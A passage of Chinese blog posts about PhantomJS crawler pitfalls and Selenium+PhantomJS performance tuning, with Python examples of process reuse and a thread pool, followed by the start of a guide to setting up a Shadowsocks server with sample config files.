<h4 id="测试（一）"><a href="#测试（一）" class="headerlink" title="测试（一）"></a>测试（一）</h4><p>当我们先用phantomjs运行了cn.bing.com，然后运行123.114.com网站，注意123.114.com是访问不了的.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gethttp(<span class="string">"http://cn.bing.com"</span>) <span class="comment">#网站能正常打开</span></div><div class="line">gethttp(<span class="string">"http://123.114.com"</span>) <span class="comment">#DNS解析失败，网站打不开</span></div></pre></td></tr></table></figure></p>
<p>执行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://cn.bing.com/</div><div class="line">http://cn.bing.com/</div></pre></td></tr></table></figure></p>
<p>可以看到我们获取123.114.com网站的信息时竟然返回了cn.bing.com。</p>
<h4 id="测试（二）"><a href="#测试（二）" class="headerlink" title="测试（二）"></a>测试（二）</h4><p>当我们访问一个网页源码里面带有onbeforeunload元素的网页时。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gethttp(<span class="string">"http://www.zzxzxyey.com"</span>) <span class="comment">#网页内存在onbeforeunload元素</span></div><div class="line">gethttp(<span class="string">"http://cn.bing.com"</span>) <span class="comment">#网站能正常打开</span></div></pre></td></tr></table></figure></p>
<p>执行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.zzxzxyey.com/</div><div class="line">http://www.zzxzxyey.com/</div></pre></td></tr></table></figure></p>
<p>可以看到以上2种情况，都会导致phantomjs状态污染，至于其他情况还待后期观察测试。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="彻底法"><a href="#彻底法" class="headerlink" title="彻底法"></a>彻底法</h4><p>每次d.get()请求完就d.quit()关闭phantomjs进程，待到新的请求再开启。（非常耗资源）</p>
<h4 id="普通法"><a href="#普通法" class="headerlink" title="普通法"></a>普通法</h4><p>每次get前去判断url是否能被dns解析，url是否能打开。（也有点耗资源）</p>
<h4 id="优雅法"><a href="#优雅法" class="headerlink" title="优雅法"></a>优雅法</h4><p>每次get后，保存current_url的值，待下一次请求后与此值相比较，如果一样，则说明状态没有被改变。<br>（当然，有些特殊情况除外，比如每次get的网站都是同一个，或者批量get的网站中有相同地址的。）</p>
<p>如遇到Phantomjs性能优化问题，请移步<a href="http://thief.one/2017/03/01/Phantomjs%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/">Phantomjs性能优化</a></p>
<p>更好的Phantomjs使用方案，请移步：<a href="http://thief.one/2017/03/31/Phantomjs正确打开方式/">Phantomjs正确打开方式</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Phantomjs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Selenium+Phantomjs性能优化]]></title>
      <url>http://thief.one/2017/03/01/Phantomjs%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">人生之路需要坚持，技术之道亦然</blockquote><br>写过爬虫的朋友应该都用过一个无头浏览器–phantomjs，使用它的原因很简单明了：能够高度模拟浏览器访问（对抗反爬虫），无头浏览（可以节省性能）。Phantomjs应用最广泛的应该还是用来执行js代码，比如写一个js脚本，利用phantomjs去执行，可以写一个页面截图、网页性能测试等等功能的。<br><a id="more"></a><br>　　phantomjs也是爬虫界的一大神器，我最初使用它就是用来爬取一些动态加载的网页，效果俱佳。当然Phantomjs也不是完美无缺的，虽然作为无头浏览器其性能已经比其他基于浏览器内核的工具快多了，但跟普通的爬虫相比，速度仍是相差甚远。<br>　　关于phantomjs的安装使用网上一大推，这里也不在重复介绍，本篇文章重点在于介绍Phantomjs性能优化问题。因为我比较熟悉python语言，因此就借助此语言谈谈Phantomjs的性能优化功法。</p>
<h3 id="基础篇（设置参数功法）"><a href="#基础篇（设置参数功法）" class="headerlink" title="基础篇（设置参数功法）"></a>基础篇（设置参数功法）</h3><p>　　Python中使用Phantomjs需要借助Selenium模块，Selenium本身也是用来做Web自动化测试的，正好封装了Phantomjs，因此我们可以借助它来使用Phantomjs。具体安装方法，这里不再介绍，Phantomjs在启动时可以设置参数，那么来看看如何通过设置参数，达到优化性能的目的。</p>
<h4 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h4><p>访问单个网站的速度</p>
<p>默认配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=[])</div><div class="line">d.get(<span class="string">"http://thief.one"</span>)</div><div class="line">d.quit()</div></pre></td></tr></table></figure></p>
<p>测试结果：3.2s</p>
<p>修改配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">service_args=[]</div><div class="line">service_args.append(<span class="string">'--load-images=no'</span>)  <span class="comment">##关闭图片加载</span></div><div class="line">service_args.append(<span class="string">'--disk-cache=yes'</span>)  <span class="comment">##开启缓存</span></div><div class="line">service_args.append(<span class="string">'--ignore-ssl-errors=true'</span>) <span class="comment">##忽略https错误</span></div><div class="line"></div><div class="line">d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=service_args)</div><div class="line">d.get(<span class="string">"http://thief.one"</span>)</div><div class="line">d.quit()</div></pre></td></tr></table></figure></p>
<p>测试结果：2.9s</p>
<p>说明：从单个网站来看，合理设置参数可以提速0.3s（如果网站上图片等资源较多，则提升的效果会更明显）。</p>
<h4 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h4><p>　　当利用爬虫访问一批网站时，遇到加载慢的网站往往会阻塞很久，遇到打不开的网站则会一直阻塞，严重影响了爬虫的性能，我们知道一般的爬虫，例如requests、urllib等模块可以设置timeout，也就是超时时间，phantomjs同样可以设置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">service_args=[]</div><div class="line">service_args.append(<span class="string">'--load-images=no'</span>)</div><div class="line">service_args.append(<span class="string">'--disk-cache=yes'</span>)</div><div class="line">service_args.append(<span class="string">'--ignore-ssl-errors=true'</span>)</div><div class="line"></div><div class="line">d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=service_args)</div><div class="line">d.implicitly_wait(10)        <span class="comment">##设置超时时间</span></div><div class="line">d.set_page_load_timeout(10)  <span class="comment">##设置超时时间</span></div><div class="line">d.get(<span class="string">"http://www.baidu.com"</span>)</div><div class="line">d.quit()</div></pre></td></tr></table></figure></p>
<p>　　说明：如果phantomjs加载时间超过10s，则会触发异常。（虽然触发异常，但current_url仍然可以用来获取当前url，源码也可以获取，只不过是没有加载完全的源码。当然只针对加载慢的网站，完全无法访问的网站除外。）</p>
<h3 id="中级篇（合理开关）"><a href="#中级篇（合理开关）" class="headerlink" title="中级篇（合理开关）"></a>中级篇（合理开关）</h3><p>　　在我使用phantomjs的一段时间内，通过不断调试，我发现phantomjs主要的性能消耗在于phantomjs进程的开启上。因为在python中使用phantomjs，相当于开启并调用phantomjs.exe（windows）执行一些操作，因此如果频繁的开启关闭phantomjs进程，则会非常消耗性能，因此要合理操作开关。</p>
<h4 id="代码测试-1"><a href="#代码测试-1" class="headerlink" title="代码测试"></a>代码测试</h4><p>单线程访问百度10次：</p>
<p>优化前：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">def phantomjs_req(url):</div><div class="line">	service_args=[]</div><div class="line">	service_args.append(<span class="string">'--load-images=no'</span>)</div><div class="line">	service_args.append(<span class="string">'--disk-cache=yes'</span>)</div><div class="line">	service_args.append(<span class="string">'--ignore-ssl-errors=true'</span>)</div><div class="line"></div><div class="line">	d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=service_args)</div><div class="line">	d.get(url)</div><div class="line">	<span class="built_in">print</span> d.current_url</div><div class="line"></div><div class="line">	d.quit()</div><div class="line"></div><div class="line">url_list=[<span class="string">"http://www.baidu.com"</span>]*10</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</div><div class="line">	phantomjs_req(i)</div></pre></td></tr></table></figure></p>
<p>测试结果：28.2s，运行过程中,phantomjs进程不断开关。</p>
<p>优化后：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">def phantomjs_req(url):</div><div class="line">	d.get(url)</div><div class="line">	<span class="built_in">print</span> d.current_url</div><div class="line"></div><div class="line">service_args=[]</div><div class="line">service_args.append(<span class="string">'--load-images=no'</span>)</div><div class="line">service_args.append(<span class="string">'--disk-cache=yes'</span>)</div><div class="line">service_args.append(<span class="string">'--ignore-ssl-errors=true'</span>)</div><div class="line">d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=service_args)</div><div class="line"></div><div class="line">url_list=[<span class="string">"http://www.baidu.com"</span>]*10</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</div><div class="line">	phantomjs_req(i)</div><div class="line"></div><div class="line">d.quit()</div></pre></td></tr></table></figure></p>
<p>测试结果：4.2s</p>
<p>　　说明：可以看到优化前与优化后代码的区别，在于将phantomjs开启关闭的操作放到了循环外面，使它始终只开关一次。可以看到性能的差别非常大，因此也可以看出phantomjs开关过程非常消耗时间。</p>
<p><em>注意：此方法虽然节省了很大的开支，但会引起另外一个phantomjs的Bug（暂且称之为Bug），也就是phantomjs状态覆盖问题。当批量去访问一些网站时，会发现返回的结果与请求的网站不对应。关于此问题，请移步<a href="http://thief.one/2017/03/01/Phantomjs%E7%88%AC%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/">Phantomjs爬过的那些坑</a>。</em></p>
<h3 id="高级篇（phantomjs并发问题）"><a href="#高级篇（phantomjs并发问题）" class="headerlink" title="高级篇（phantomjs并发问题）"></a>高级篇（phantomjs并发问题）</h3><p>　　通过前面的优化，我们发现phantomjs的性能提高了很多，但即便如此，以上代码也只是实现了单线程中的优化。当遇到大批量的网站时，并发是必须的选择，那么Phantomjs在并发中又改如何使用与优化呢？</p>
<h4 id="优化之路"><a href="#优化之路" class="headerlink" title="优化之路"></a>优化之路</h4><p>在优化phantomjs并发性能的问题上，我也并没有一帆风顺，期间查阅了很多资料，也踩过了很多的坑。</p>
<h5 id="不成熟的优化（一）"><a href="#不成熟的优化（一）" class="headerlink" title="不成熟的优化（一）"></a>不成熟的优化（一）</h5><p>起初我用了最直接了当的方法，企图开启phantomjs并发的性能。（运行一个phantomjs进程，进程内开启多线程）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">d=webdriver.PhantomJS()   </div><div class="line">def <span class="built_in">test</span>(url):</div><div class="line">     d.get(url)</div><div class="line"></div><div class="line">url_list=[<span class="string">"http://www.baidu.com"</span>]*10</div><div class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">     threading.Thread(target=<span class="built_in">test</span>,args=(url,)).start() </div><div class="line">d.quit()</div></pre></td></tr></table></figure></p>
<p>　　然而运行连连出错，在查看了官网等资料后发现phantomjs是单线程的，因此如果按照上面的写法，那么不能使用多线程同时去执行，此次优化失败！</p>
<h4 id="不成熟的优化（二）"><a href="#不成熟的优化（二）" class="headerlink" title="不成熟的优化（二）"></a>不成熟的优化（二）</h4><p>既然一个phantomjs只能支持单线程，那么我就开启多个phantomjs。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def <span class="built_in">test</span>(url):</div><div class="line">     d=webdriver.PhantomJS()</div><div class="line">     d.get(url)</div><div class="line">     d.quit()</div><div class="line"></div><div class="line">url_list=[<span class="string">"http://www.baidu.com"</span>]*10</div><div class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">    threading.Thread(target=<span class="built_in">test</span>,args=(url,)).start()</div></pre></td></tr></table></figure></p>
<p>　　终于我看到同时10个phantomjs进程被开启了，10个网站的请求可以并发执行了。然而当网站的数量为50个时，要同时运行50个phantomjs进程？No，这必定会搞垮服务器，此次优化失败！</p>
<h4 id="不成熟的优化（三）"><a href="#不成熟的优化（三）" class="headerlink" title="不成熟的优化（三）"></a>不成熟的优化（三）</h4><p>　　经过以上2次失败，我开始思考，如何只开启10个phantomjs进程，然后每个phantomjs进程按顺序执行请求网站的操作呢?这样就相当于10个进程并发执行了。<br>终于在某个夜晚，我想出了以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">def  <span class="built_in">test</span>():</div><div class="line">     d=webdriver.PhantomJS()</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</div><div class="line">        d.get(url)</div><div class="line">     d.quit()</div><div class="line"></div><div class="line">url_list=[<span class="string">"http://www.baidu.com"</span>]*50</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">     threading.Thread(target=<span class="built_in">test</span>).start()</div></pre></td></tr></table></figure></p>
<p>　　成功开启了10个phantomjs进程，每个进程按顺序执行了50个网站的请求。等等，貌似这样设计，每个phantomjs进程都会去访问50次百度，这不是最初的要求，oh，No！</p>
<h4 id="不算成熟但还可以的优化"><a href="#不算成熟但还可以的优化" class="headerlink" title="不算成熟但还可以的优化"></a>不算成熟但还可以的优化</h4><p>　　在第三阶段并发优化的雏形已经出来了，只不过还需要解决一个多线程共享资源的问题，这个可以用Queue模块解决。那么直接看优化后并发的代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">__author__=<span class="string">"nMask"</span></div><div class="line">__Date__=<span class="string">"20170224"</span></div><div class="line">__Blog__=<span class="string">"http://thief.one"</span></div><div class="line"></div><div class="line">import Queue</div><div class="line">from selenium import webdriver</div><div class="line">import threading</div><div class="line">import time</div><div class="line"></div><div class="line">class conphantomjs:</div><div class="line">	phantomjs_max=1             <span class="comment">##同时开启phantomjs个数</span></div><div class="line">	jiange=0.00001                  <span class="comment">##开启phantomjs间隔</span></div><div class="line">	timeout=20                  <span class="comment">##设置phantomjs超时时间</span></div><div class="line">	path=<span class="string">"D:\python27\Scripts\phantomjs.exe"</span> <span class="comment">##phantomjs路径</span></div><div class="line">	service_args=[<span class="string">'--load-images=no'</span>,<span class="string">'--disk-cache=yes'</span>] <span class="comment">##参数设置</span></div><div class="line"></div><div class="line">	def __init__(self):</div><div class="line">		self.q_phantomjs=Queue.Queue()   <span class="comment">##存放phantomjs进程队列</span></div><div class="line"></div><div class="line">	def getbody(self,url):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		利用phantomjs获取网站源码以及url</div><div class="line">		'<span class="string">''</span></div><div class="line">		d=self.q_phantomjs.get()</div><div class="line"></div><div class="line">		try:</div><div class="line">			d.get(url)</div><div class="line">		except:</div><div class="line">			<span class="built_in">print</span> <span class="string">"Phantomjs Open url Error"</span></div><div class="line">		</div><div class="line">		url=d.current_url</div><div class="line">		</div><div class="line">		self.q_phantomjs.put(d)</div><div class="line">		</div><div class="line">		<span class="built_in">print</span> url</div><div class="line"></div><div class="line">	def open_phantomjs(self):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		多线程开启phantomjs进程</div><div class="line">		'<span class="string">''</span></div><div class="line">		def open_threading():</div><div class="line">			d=webdriver.PhantomJS(conphantomjs.path,service_args=conphantomjs.service_args) </div><div class="line">			d.implicitly_wait(conphantomjs.timeout)        <span class="comment">##设置超时时间</span></div><div class="line">			d.set_page_load_timeout(conphantomjs.timeout)  <span class="comment">##设置超时时间</span></div><div class="line">			</div><div class="line">			self.q_phantomjs.put(d) <span class="comment">#将phantomjs进程存入队列</span></div><div class="line"></div><div class="line">		th=[]</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(conphantomjs.phantomjs_max):</div><div class="line">			t=threading.Thread(target=open_threading)</div><div class="line">			th.append(t)</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">			i.start()</div><div class="line">			time.sleep(conphantomjs.jiange) <span class="comment">#设置开启的时间间隔</span></div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">			i.join()</div><div class="line"></div><div class="line"></div><div class="line">	def close_phantomjs(self):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		多线程关闭phantomjs对象</div><div class="line">		'<span class="string">''</span></div><div class="line">		th=[]</div><div class="line">		def close_threading():</div><div class="line">			d=self.q_phantomjs.get()</div><div class="line">			d.quit()</div><div class="line"></div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(self.q_phantomjs.qsize()):</div><div class="line">			t=threading.Thread(target=close_threading)</div><div class="line">			th.append(t)</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">			i.start()</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">			i.join()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	用法：</div><div class="line">	1.实例化类</div><div class="line">	2.运行open_phantomjs 开启phantomjs进程</div><div class="line">	3.运行getbody函数，传入url</div><div class="line">	4.运行close_phantomjs 关闭phantomjs进程</div><div class="line">	'<span class="string">''</span></div><div class="line">	cur=conphantomjs()</div><div class="line">	conphantomjs.phantomjs_max=10</div><div class="line">	cur.open_phantomjs()</div><div class="line">	<span class="built_in">print</span> <span class="string">"phantomjs num is "</span>,cur.q_phantomjs.qsize()</div><div class="line">	</div><div class="line">	url_list=[<span class="string">"http://www.baidu.com"</span>]*50</div><div class="line"></div><div class="line">	th=[]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> url_list:</div><div class="line">		t=threading.Thread(target=cur.getbody,args=(i,))</div><div class="line">		th.append(t)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">		i.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> th:</div><div class="line">		i.join()</div><div class="line"></div><div class="line">	cur.close_phantomjs()</div><div class="line">	<span class="built_in">print</span> <span class="string">"phantomjs num is "</span>,cur.q_phantomjs.qsize()</div></pre></td></tr></table></figure></p>
<h4 id="代码测试："><a href="#代码测试：" class="headerlink" title="代码测试："></a>代码测试：</h4><p>利用单线程优化后的代码访问50次百度：10.3s。<br>利用10个phantomjs并发访问50次百度：8.1s</p>
<p>　　说明：并发优化后的代码同时开启了10个phantomjs进程，用于处理50次访问百度的请求。由于一个phantomjs同一时间不能处理2个url，也就是说不支持多线程处理，因此开启10个phantomjs进程就相当于程序的并发数量为10。如果除去开启10个phantomjs耗费的时间，总共执行50次访问的时间也就2s左右，速度快了不少。</p>
<h3 id="终极篇"><a href="#终极篇" class="headerlink" title="终极篇"></a>终极篇</h3><p>　　高级篇中解决并发效率，我用的实际上是多进程，无论python同时开启多少个线程去让phantomjs进程执行操作，一个phantomjs进程同时也只能执行一个访问请求。因此并发的数量取决于开启phantomjs的数量，而phantomjs又是以进程的形式去运行的。<br>　　既然知道了性能的瓶颈所在，那么终极篇中，我们可以使用分布式+phantomjs多进程并发来提高性能。</p>
<h3 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a>替代方案</h3><p>以上的优化方案并不能从根本上解决phantomjs性能问题，更好的替代方案请移步：<br><a href="http://thief.one/2017/03/31/Phantomjs正确打开方式/">Phantomjs正确打开方式</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Phantomjs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Shadowsocks折腾记]]></title>
      <url>http://thief.one/2017/02/22/Shadowsocks%E6%8A%98%E8%85%BE%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">技术本身也是由一个个细节拼凑而成</blockquote><br>事情的起因是服务器网络被某网站屏蔽，需要使用http代理去访问。由于没有稳定好用的http代理地址（网上免费的信不过，也不稳定），然而手头上还有空余的服务器（云上），于是就想着在云服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接。思路有了，那就动手干吧，搭建shadowsocks服务并不难，然而原本应该只需半小时就能搞定的活，却足足花了2个多小时（socks转http代理问题），因此在此小计一番，以儆效尤。<br><a id="more"></a></p>
<h3 id="Install-shadowsocks-Server"><a href="#Install-shadowsocks-Server" class="headerlink" title="Install shadowsocks Server"></a>Install shadowsocks Server</h3><p>搭建shadowsocks服务端，分别介绍windows与linux下搭建方法。</p>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>先安装python，然后再利用pip安装shadowsocks.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure></p>
<p>然后创建一个文件，如：config.json<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"server"</span>:<span class="string">""</span>,     <span class="comment">##服务器ip地址</span></div><div class="line"><span class="string">"server_port"</span>:8000,  <span class="comment">##代理端口</span></div><div class="line"><span class="string">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</div><div class="line"><span class="string">"local_port"</span>:1080, <span class="comment">##本地监听端口</span></div><div class="line"><span class="string">"password"</span>:<span class="string">""</span>,   <span class="comment">##连接密码</span></div><div class="line"><span class="string">"timeout"</span>:300,</div><div class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span>, <span class="comment">##加密方式</span></div><div class="line"><span class="string">"dast_open"</span>:<span class="literal">false</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>填写完以后，在cmd里运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssserver -c config.json</div></pre></td></tr></table></figure></p>
<p>如果没有报错的话，shadowsocks服务端就已经搭建好了。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h5><p>与windows的类似，先通过pip安装shadowsocks.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install  python-pip</div><div class="line">sudo apt-get install python-m2crypto</div><div class="line">sudo pip install  shadowsocks</div></pre></td></tr></table></figure></p>
<h5 id="配置config文件"><a href="#配置config文件" class="headerlink" title="配置config文件"></a>配置config文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir /etc/shadowsocks</div><div class="line">vim /etc/shadowsocks/config.json （一定要在这个目录下）</div></pre></td></tr></table></figure>
<p>写入：(ip也可以写内网地址，只要能转发出来即可。)<br>单用户配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"server"</span>:<span class="string">""</span>,  </div><div class="line"><span class="string">"server_port"</span>:8000,</div><div class="line"><span class="string">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</div><div class="line"><span class="string">"local_port"</span>:1080,</div><div class="line"><span class="string">"password"</span>:<span class="string">""</span>,</div><div class="line"><span class="string">"timeout"</span>:300,</div><div class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span>,</div><div class="line"><span class="string">"fast_open"</span>:<span class="literal">false</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>多用户配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"server"</span>:<span class="string">""</span>,</div><div class="line"><span class="string">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</div><div class="line"><span class="string">"local_port"</span>:1080,</div><div class="line"><span class="string">"port_password"</span>:&#123;</div><div class="line"><span class="string">"8000"</span>:<span class="string">"123456"</span>,</div><div class="line"><span class="string">"8001"</span>:<span class="string">"123456"</span></div><div class="line">&#125;,</div><div class="line"><span class="string">"timeout"</span>:300,</div><div class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span>,</div><div class="line"><span class="string">"fast_open"</span>:<span class="literal">false</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h5 id="命令行启动关闭"><a href="#命令行启动关闭" class="headerlink" title="命令行启动关闭"></a>命令行启动关闭</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssserver -c /etc/shadowsocks/config.json <span class="_">-d</span> start 后台启动</div><div class="line">ssserver -c /etc/shadowsocks/config.json <span class="_">-d</span> stop 后台停止</div></pre></td></tr></table></figure>
